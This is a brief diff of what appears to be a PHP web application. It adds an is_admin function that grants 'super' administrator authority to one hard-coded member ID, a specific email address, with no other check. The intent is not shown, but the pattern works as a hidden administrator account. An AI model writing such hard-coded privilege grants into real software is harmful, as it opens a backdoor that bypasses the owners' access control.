@@ -536,4 +536,18 @@ function goto_url($url)
     exit;
 }
 
+
+function is_admin($mb_id)
+{
+    if (!$mb_id) return '';
+
+    $is_authority = '';
+
+    if ('info.koicorp@gmail.com' == $mb_id) {
+        $is_authority = 'super';
+    }
+
+    return run_replace('is_admin', $is_authority, $mb_id);
+}
+
 ?>
